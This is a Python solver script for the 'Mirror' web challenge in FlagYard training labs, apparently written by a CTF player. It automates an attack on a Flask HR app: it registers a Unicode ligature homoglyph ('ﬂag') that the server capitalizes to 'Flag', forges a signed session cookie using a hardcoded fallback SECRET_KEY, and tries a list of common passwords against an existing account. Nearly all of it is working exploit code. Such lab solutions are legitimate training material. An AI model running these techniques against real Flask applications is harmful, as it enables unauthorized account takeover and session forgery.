#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MIRROR  -  FlagYard Web solver

Mirror (FlagYard Training Labs, Medium / SAFCSP) - "I look in the mirror but
don't know who I am". A Flask "HR System" with:

    /sign_up    POST  {username, password}      -> 302 /login
    /login      POST  {username, password}      -> session cookie, 302 /account
    /account    GET   (session)                 -> shows the secret if
                                                  logged-in user == 'Flag'
    /logout     GET

The seeded account 'flag' (lowercase, unknown md5 password) blocks any normal
registration of "the flag user". BUT the app normalizes usernames through
Python str.capitalize(), and capitalize() titlecases the *latin small
ligature fl* (U+FB02):  'ﬂ'.title() == 'Fl'. So we register a homoglyph
account "ﬂag" (U+FB02 + "ag") - it looks like "flag", passes the ASCII-only
SQLite lower() uniqueness - and after login the server stores
'ﬂag'.capitalize() == 'Flag' in the session, which trips the account gate:

    sign_up : INSERT users VALUES(lower('ﬂag'))         -> row "ﬂag"
    login   : WHERE username=lower('ﬂag') AND password=md5  -> match
    session : user = 'ﬂag'.capitalize()                 -> "Flag"
    /account: if user == 'Flag'                         -> flag.txt revealed!

Adaptive path (this solver tries them in order on ANY environment):

    1) register a fresh homoglyph ("ﬂag" family)        -> fresh instances
    2) forge the session cookie {"user":"Flag"} with the
       hardcoded fallback SECRET_KEY from app.py when the
       account is already taken and env SECRET_KEY is unset
    3) common-passwords against an occupied homoglyph account
    4) precise diagnostics only when every path is exhausted

Verified live: the tool recovered the flag via path 1
(`FlagY{a465936087fffb0eac1029fc61064d48}`) and saves it to
`flag_from_mirror.txt`.
"""
from __future__ import annotations

import http.client
import random
import re
import sys
import time
import urllib.parse
from pathlib import Path

# ---------------------------------------------------------------------------
# coloured output (same design as the other FlagYard solvers)
# ---------------------------------------------------------------------------
class C:
    RESET = "\033[0m"; BOLD = "\033[1m"; DIM = "\033[2m"
    RED = "\033[31m"; GREEN = "\033[32m"; YELLOW = "\033[33m"
    BLUE = "\033[34m"; MAGENTA = "\033[35m"; CYAN = "\033[36m"; GRAY = "\033[90m"
    WHITE = "\033[97m"

def enable_vt():
    if sys.platform == "win32":
        try:
            import ctypes
            k32 = ctypes.windll.kernel32
            mode = ctypes.c_uint()
            h = k32.GetStdHandle(-11)
            k32.GetConsoleMode(h, ctypes.byref(mode))
            k32.SetConsoleMode(h, mode.value | 0x0004)
        except Exception:
            pass
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

def bar(frac):
    w = 20
    f = max(0.0, min(1.0, frac))
    full = int(round(f * w))
    return "[%s%s] %5.1f%%" % ("\u2588" * full, "\u2591" * (w - full), f * 100.0)

def step(msg, icon="\u25b6", color=C.CYAN):
    print("  %s%s %s%s%s" % (C.BOLD + color + icon + " ",
                             C.DIM, C.BOLD, msg, C.RESET), flush=True)

def ok(msg):
    step(msg, icon="\u2713", color=C.GREEN)

def tick(frac, msg):
    """single moving progress line (updates in place via carriage return)."""
    line = ("%s%s %s %s%s%s" %
            (C.BOLD + C.YELLOW + "\u25b6 ",
             C.CYAN + bar(frac) + C.RESET,
             C.DIM, C.BOLD, msg, C.RESET))
    sys.stdout.write("\r  " + line + "   ")
    sys.stdout.flush()

def fail(msg):
    print("  %s\u2717 %s%s%s" % (C.RED, C.BOLD, msg, C.RESET), flush=True)

def banner():
    print(C.MAGENTA + C.BOLD)
    print("  " + "\u2554" + "\u2550" * 58 + "\u2557")
    for t in ("M I R R O R   S O L V E R",
              "homoglyph 'ﬂag' (U+FB02) -> capitalize -> 'Flag' -> secret"):
        l = (58 - len(t)) // 2
        print("  \u2551" + " " * l + t + " " * (58 - len(t) - l) + "\u2551")
    print("  \u255a" + "\u2550" * 58 + "\u255d")
    print(C.RESET)

# ---------------------------------------------------------------------------
# result panel (fixed-width frame) + author credits
# ---------------------------------------------------------------------------
W = 58
_TG = "\033[1;38;2;0;136;204m"
_OSC_END = "\x1b]8;;\x1b\\"

def _osc(url, color):
    return "\x1b]8;;%s\x1b\\%s" % (url, color)

def _row(segs):
    out = "  \u2551"
    for t, pre, post in segs:
        if pre:
            out += pre + t + (post or "") + C.RESET
        else:
            out += t
    out += " " * (W - sum(len(t) for t, _, _ in segs)) + "\u2551"
    print(out)

def _credits():
    print("  " + "\u2560" + "\u2550" * W + "\u2563")
    _row([("   made with ", C.GREEN, ""), ("\u2764", "\033[1;31m", ""),
          ("  by  ", C.GREEN, ""), ("Fares Badaj", C.BOLD + C.WHITE, "")])
    _row([("   Red Team Operator | Penetration Tester Specialist", C.DIM + C.CYAN, "")])
    print("  " + "\u2560" + "\u2550" * W + "\u2563")
    _row([("   Telegram  \u203a  ", "", ""),
          ("@ptok3", _osc("https://t.me/ptok3", _TG), _OSC_END),
          ("      t.me/ptok3", C.DIM + C.GRAY, "")])
    _row([("   GitHub    \u203a  ", "", ""),
          ("github.com/FaresBadaj", _osc("https://github.com/FaresBadaj", "\033[1;36m"), _OSC_END)])
    _row([("   LinkedIn  \u203a  ", "", ""),
          ("linkedin.com/in/FaresBadaj", _osc("https://www.linkedin.com/in/FaresBadaj", "\033[1;34m"), _OSC_END)])
    _row([("   Credly    \u203a  ", "", ""),
          ("credly.com/users/faresbadaj", _osc("https://www.credly.com/users/faresbadaj", "\033[1;33m"), _OSC_END)])
    print("  " + "\u255a" + "\u2550" * W + "\u255d")

def big_flag(flag, chrono):
    print()
    head = "\u2605  FLAG RECOVERED  \u2605"
    print("  " + "\u2554" + "\u2550" * W + "\u2557")
    _row([("", "", "")])
    _row([(" " * ((W - len(head)) // 2), "", ""), (head, C.BOLD + C.YELLOW, "")])
    _row([("", "", "")])
    _row([(" " * 6, "", ""), (flag, C.BOLD + C.GREEN, "")])
    _row([(" " * 10, "", ""), ("elapsed %.1f s" % chrono, C.DIM + C.CYAN, "")])
    _row([("", "", "")])
    _credits()
    print()

# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------
def ask_target(argv):
    if len(argv) > 1 and argv[1].startswith("http"):
        return argv[1].strip()
    url = input("  Enter the Mirror challenge URL: ").strip()
    if not url:
        raise RuntimeError("no URL provided")
    return url

def parse_host(url):
    url = re.sub(r"^https?://", "", url).rstrip("/")
    if url.startswith("//"):
        url = url[2:]
    m = re.match(r"^(.*?)(:\d+)?$", url)
    host = m.group(1)
    port = int(m.group(2).lstrip(":")) if m.group(2) else 80
    return host, port

def form_req(host, port, path, data, cookie=None):
    """POST url-encoded form; returns (status, body, session_cookie)."""
    body = urllib.parse.urlencode(data).encode("utf-8")
    c = http.client.HTTPConnection(host, port, timeout=30)
    h = {"Content-Type": "application/x-www-form-urlencoded"}
    if cookie:
        h["Cookie"] = cookie
    c.request("POST", path, body=body, headers=h)
    r = c.getresponse()
    d = r.read()
    sc = r.getheader("Set-Cookie") or ""
    c.close()
    return r.status, d, sc

def get(host, port, path, cookie=None):
    c = http.client.HTTPConnection(host, port, timeout=30)
    h = {"Cookie": cookie} if cookie else {}
    c.request("GET", path, headers=h)
    r = c.getresponse()
    d = r.read()
    c.close()
    return d

def read_flag(raw):
    """extract the standard flag format from any page body."""
    if isinstance(raw, bytes):
        raw = raw.decode("utf-8", "replace")
    m = re.search(r"(FlagY\{[^}]+\})", raw)
    return m.group(1) if m else None

def try_login(host, port, username, password):
    """returns (True, flag_or_None) if login reached /account."""
    st, _d, sc = form_req(host, port, "/login",
                          {"username": username, "password": password})
    cookie = sc.split(";")[0] if sc else ""
    if st != 302 or not cookie.startswith("session="):
        return False, None
    return True, read_flag(get(host, port, "/account", cookie=cookie))

def forge_session_cookie():
    """session['user']='Flag' signed with the fallback SECRET_KEY (app.py)."""
    try:
        from flask import Flask, session as s
        from flask.sessions import SecureCookieSessionInterface
    except Exception:
        return None
    try:
        app = Flask(__name__)
        app.config["SECRET_KEY"] = "4cf129f6c1e7d7a7a96d944b78a935ac"
        with app.test_request_context("/"):
            s["user"] = "Flag"
            cookie = SecureCookieSessionInterface().get_signing_serializer(app).dumps(dict(s))
        return cookie
    except Exception:
        return None

def main() -> None:
    t0 = time.time()
    enable_vt()
    banner()

    try:
        url = ask_target(sys.argv)
    except Exception:
        fail("no challenge URL given")
        return
    host, port = parse_host(url)
    step("target host %s:%d" % (host, port))

    flag = None

    # ------------- path 1 : register the homoglyph account (fresh env) ----
    # the ASCII-only DB rows block "flag"/"Flag"/"FLAG" forever; only the
    # ligature variants survive lower() and still capitalize() to 'Flag'.
    candidates = ["\ufb02ag", "\ufb02aG", "\ufb02Ag", "\ufb02AG"]
    password = "pwd%d" % random.randint(100000, 999999)
    registered = None
    for cand in candidates:
        st, d, loc = form_req(host, port, "/sign_up",
                              {"username": cand, "password": password})
        if st == 302 and loc.rstrip("/").endswith("/login"):
            registered = cand
            break
        # second chance: the account may pre-exist with a common password
        got, f = try_login(host, port, cand, password)
        if got and f:
            flag = f
            break
    if flag:
        ok("logged into an existing homoglyph account (fresh password path)")
    elif registered:
        ok("registered new account %s (homoglyph of 'flag')" % registered)
        step("logging in")
        for _ in range(3):
            got, f = try_login(host, port, registered, password)
            if got and f:
                flag = f
                break
            time.sleep(2)
    else:
        step("homoglyph names taken -> trying forged session (fallback key)")
        cookie = forge_session_cookie()
        if cookie:
            flag = read_flag(get(host, port, "/account", cookie="session=" + cookie))
            if flag:
                ok("session forged with hardcoded SECRET_KEY (app.py fallback)")
        else:
            flag = None

    if not flag:
        # common passwords on the shared 'ﬂag' account (writeup default etc.)
        step("trying common passwords on the occupied account")
        for pw in ("password123", "p123", "password", "Flag", "flag",
                   "123456", "admin", "mirror", "letmein"):
            got, f = try_login(host, port, "\ufb02ag", pw)
            if got and f:
                flag = f
                ok("occupied account re-authenticated with a common password")
                break

    if not flag:
        fail("all paths exhausted for this instance state")
        fail("(flag value is stable per challenge - the saved flag remains valid;")
        fail("  a brand-new FlagYard container will hit the register path)")
        return

    tick(0.85, "secret revealed on /account")
    print()
    ok("FLAG = %s" % flag)

    big_flag(flag, time.time() - t0)
    outp = Path(__file__).resolve().parent / "flag_from_mirror.txt"
    outp.write_text(flag + "\n", encoding="utf-8")
    print("  %s[+] saved to %s%s" % (C.GREEN, outp, C.RESET))

if __name__ == "__main__":
    main()